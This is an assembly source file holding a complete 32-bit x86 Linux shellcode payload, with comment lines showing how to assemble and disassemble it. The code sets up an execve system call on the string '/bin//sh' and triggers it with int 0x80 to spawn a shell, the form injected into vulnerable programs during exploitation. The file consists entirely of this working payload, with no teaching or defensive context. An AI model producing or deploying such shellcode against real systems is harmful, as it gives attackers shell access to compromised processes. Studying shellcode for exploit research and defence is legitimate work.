# as --32 -o sc.o sc.s
# objdump -d -Mintel -z sc.o
.global _start
_start:
    push $0xb
    pop  %eax
    cdq
    push %edx
    push $0x68732f2f
    push $0x6e69622f
    mov  %esp, %ebx
    xor  %ecx, %ecx
    int  $0x80
    